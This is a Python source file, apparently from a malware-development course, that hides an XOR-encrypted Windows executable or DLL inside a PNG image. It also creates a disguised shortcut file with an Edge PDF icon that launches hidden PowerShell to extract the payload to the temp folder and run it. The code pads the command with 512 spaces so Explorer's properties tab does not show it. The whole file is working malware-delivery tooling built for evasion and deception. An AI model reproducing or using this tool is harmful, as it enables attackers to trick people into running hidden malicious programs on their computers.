# @NUL0x4C | @mrd0x : MalDevAcademy
import os
import subprocess
import sys


def install(package):
    print(f"[i] Installing {package}...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"[!] Failed to install {package}: {e}")
        sys.exit(1)

# Try importing libraries and install if missing
try:
    import pefile
except ImportError:
    print("[i] Detected an missing library")
    install("pefile")

try:
    from colorama import Fore, Style, init
except ImportError:
    print("[i] Detected an missing library")
    install("colorama")

try:
    from win32com.client import Dispatch
except ImportError:
    print("[i] Detected an missing library")
    install("pywin32")

import argparse
import os
import random
import shutil
import string
import sys
import zlib

import pefile
from colorama import Fore, Style, init
from win32com.client import Dispatch

PNG_SGN     = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'                       # PNG file signature  
IDAT        = b'\x49\x44\x41\x54'                                       # 'IDAT'
IEND        = b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'       # IEND footer

# default icon path and index (msedge pdf)
DFLT_ICON       = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe"
DFLT_ICON_INDX  = 11

# ------------------------------------------------------------------------------------------------------------------------

def print_red(data):
    print(f"{Fore.RED}{data}{Style.RESET_ALL}")
def print_blue(data):
    print(f"{Fore.BLUE}{data}{Style.RESET_ALL}")    

# ------------------------------------------------------------------------------------------------------------------------

def generate_random_string(length):
    random_string = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return random_string

# ------------------------------------------------------------------------------------------------------------------------

def calculate_chunk_crc(chunk_data):
    return zlib.crc32(chunk_data) & 0xffffffff  

# ------------------------------------------------------------------------------------------------------------------------

def xor_input_data(data, key):
    return bytes([byte ^ key for byte in data])

# ------------------------------------------------------------------------------------------------------------------------

def create_idat_section(buffer):

    idat_chunk_length    = len(buffer).to_bytes(4, byteorder='big')                            # Create IDAT chunk length
    idat_crc             = calculate_chunk_crc(IDAT + buffer).to_bytes(4, byteorder='big')     # Compute CRC
    idat_section         = idat_chunk_length + IDAT + buffer + idat_crc                        # The complete IDAT section

    print(f"{Fore.CYAN}[>] Created IDAT Of Length [{int.from_bytes(idat_chunk_length, byteorder='big')}] And Hash [{hex(int.from_bytes(idat_crc, byteorder='big'))}]{Style.RESET_ALL}")
    return idat_section

# ------------------------------------------------------------------------------------------------------------------------

def remove_bytes_from_end(file_path, bytes_to_remove):
    with open(file_path, 'rb+') as f:
        f.seek(0, 2)
        file_size = f.tell()
        f.truncate(file_size - bytes_to_remove)    

# ------------------------------------------------------------------------------------------------------------------------

def plant_pe_in_png(ipng_fname, opng_fname, pe_buffer):

    # check input png file size
    # we are xoring the PE file with a single-byte key fetched from a random offset from the png file
    # the offset is between 100 and 450, therefore we need our input png file to be bigger (otherwise we'll access an invalid offset when attempting to retrieve the key) 
    if os.path.getsize(ipng_fname) < 500:
        print_red("[!] Input PNG file is too small to generate XOR key offset")
        sys.exit(0)

    # new copy of the input png file
    shutil.copyfile(ipng_fname, opng_fname)

    # fetch the key offset and key value
    xor_key_offset = xor_key = 0x00
    while True:
        xor_key_offset = random.randint(100, 450)
        xor_key = read_byte_at_offset(opng_fname, xor_key_offset)
        if xor_key != 0x00:
            break

    print(f"{Fore.WHITE}[i] Using XOR Key [{hex(xor_key)}] Of Offset: {xor_key_offset}{Style.RESET_ALL}")

    # encrypt our pe file with the fetched key        
    xored_buffer = xor_input_data(pe_buffer, xor_key)

    # remove the iend header
    remove_bytes_from_end(opng_fname, len(IEND))

    # ignoring the size limit of the IDAT section
    # create an IDAT section out of our encrypted PE file and append it
    # to the end of the output png file
    idat_section = create_idat_section(xored_buffer)
    with open(opng_fname, 'ab') as f:
        f.write(idat_section)

    # add the IEND footer
    with open(opng_fname, 'ab') as f:
        f.write(IEND)

    return xor_key_offset

# ------------------------------------------------------------------------------------------------------------------------

def create_lnk_extraction_cmnd(xor_key_offset, opng_fname, input_pe_fname):
    
    otpt_pe_file_name = generate_random_string(random.randint(4, 8))
    exraction_command = ""

    if (is_dll(input_pe_fname)):
        otpt_pe_file_name += ".dll"
        runtime_exprtdfnc_args = input(f"{Fore.WHITE}\t[>] Enter {Fore.CYAN}{input_pe_fname}'s{Style.RESET_ALL} exported function name and arguments: {Style.RESET_ALL}")
        exraction_command = f"$data=[IO.File]::ReadAllBytes('{opng_fname}');$key=$data[{xor_key_offset}];$file=$env:TEMP+'\\{otpt_pe_file_name}';$i=[Text.Encoding]::ASCII.GetString($data).LastIndexOf('IDAT')+4;$xdata = ($data[$i..$data.Length] | ForEach-Object {{ $_ -bxor $key }}); [IO.File]::WriteAllBytes($file, $xdata); rundll32.exe $file {runtime_exprtdfnc_args}"

    else:
        otpt_pe_file_name += ".exe"
        exraction_command = f"$data=[IO.File]::ReadAllBytes('{opng_fname}');$key=$data[{xor_key_offset}];$file=$env:TEMP+'\\{otpt_pe_file_name}';$i=[Text.Encoding]::ASCII.GetString($data).LastIndexOf('IDAT')+4;$xdata = ($data[$i..$data.Length] | ForEach-Object {{ $_ -bxor $key }}); [IO.File]::WriteAllBytes($file, $xdata); cmd /c $file"

    print(f"[i] Payload Will Be Executed As: {Fore.YELLOW}%TEMP%\\{otpt_pe_file_name}{Style.RESET_ALL}")
    
    # debugging
    # print_blue(f"[DEBUG] Executing :{exraction_command}")
    return exraction_command

# ------------------------------------------------------------------------------------------------------------------------

def create_shortcut(lnk_path, arguments, icon_file="", icon_index=0, working_directory="", window_style=7):
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(lnk_path)
    if icon_file is not None:
        shortcut.IconLocation = f"{icon_file},{icon_index}"
    shortcut.Targetpath = r"powershell.exe"
    shortcut.Arguments = arguments
    shortcut.WorkingDirectory = working_directory
    shortcut.WindowStyle = window_style  
    shortcut.save()

# ------------------------------------------------------------------------------------------------------------------------

def is_png(file_path):

    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"[!] '{file_path}' does not exist")

    try:
        # Read the first 8 bytes to check for the PNG header signature 
        with open(file_path, 'rb') as f:
            return f.read(len(PNG_SGN)) == PNG_SGN
    except Exception as e:
        print_red(f"[!] Error: {e}")
        return False
    
# ------------------------------------------------------------------------------------------------------------------------

def is_pe(file_path):
    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"[!] '{file_path}' does not exist")
         
    try:
        pe = pefile.PE(file_path)
        return hasattr(pe, 'OPTIONAL_HEADER')
    except pefile.PEFormatError:
        return False
    
# ------------------------------------------------------------------------------------------------------------------------

def is_dll(file_path):
    if not is_pe(file_path):
        return False

    try:
        pe = pefile.PE(file_path)
        characteristics = pe.FILE_HEADER.Characteristics
        return (characteristics & 0x2000) != 0
    except pefile.PEFormatError:
        return False
    
# ------------------------------------------------------------------------------------------------------------------------

def read_byte_at_offset(file_path, offset):
    try:
        with open(file_path, 'rb') as f:
            f.seek(offset)
            byte = f.read(1)
            return byte[0] if byte else None  
    except Exception as e:
        print_red(f"[!] Error: {e}")
        return None

# ------------------------------------------------------------------------------------------------------------------------

def read_payload(file_path):

    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"[!] '{file_path}' does not exist")
    
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except Exception as e:
        print_red(f"[!] Error: {e}")
        return None
    
# ------------------------------------------------------------------------------------------------------------------------

def main():

    parser = argparse.ArgumentParser(description="Embed an Encrypted PE File within a PNG and Generate a LNK File to Extract It")
    parser.add_argument('-i', '--input', type=str, required=True, help="Input PE payload file")
    parser.add_argument('-png', '--pngfile', type=str, required=True, help="Input PNG file to embed the PE payload into")
    parser.add_argument('-o', '--output', type=str, required=True, help="Output PNG/LNK file name")
    args = parser.parse_args()

    # Add file extensions to output files (PNG/LNK)
    olnk_fname = opng_fname = os.path.splitext(args.output)[0] 
    olnk_fname += '.lnk'
    opng_fname += '.png'

    # verify input pe
    if not is_pe(args.input):
        print_red(f"[!] '{args.input}' is not a valid PE file.")
        sys.exit(0)

    # verify input png
    if not is_png(args.pngfile):
        print_red(f"[!] '{args.pngfile}' is not a valid PNG file.")
        sys.exit(0)

    # read PE file
    payload_data = read_payload(args.input)
    if payload_data is None:
        sys.exit(0)

    # create output png file
    xor_key_offset = plant_pe_in_png(args.pngfile, opng_fname, payload_data)
    print(f"[*] {Fore.YELLOW}{opng_fname}{Style.RESET_ALL} is created!")

    # create extraction command
    extraction_command = create_lnk_extraction_cmnd(xor_key_offset, opng_fname, args.input)

    # Add 512 space before the command to overflow explorer's shortcut properties tab 
    overflow_explorer_prop_tab_str = ""
    for i in range(512):
        overflow_explorer_prop_tab_str = overflow_explorer_prop_tab_str + " "

    # create output lnk file
    create_shortcut(olnk_fname, overflow_explorer_prop_tab_str + extraction_command, icon_file=DFLT_ICON, icon_index=DFLT_ICON_INDX)
    print(f"[*] {Fore.YELLOW}{olnk_fname}{Style.RESET_ALL} is created!")

# ------------------------------------------------------------------------------------------------------------------------

if __name__ == "__main__":
    main()

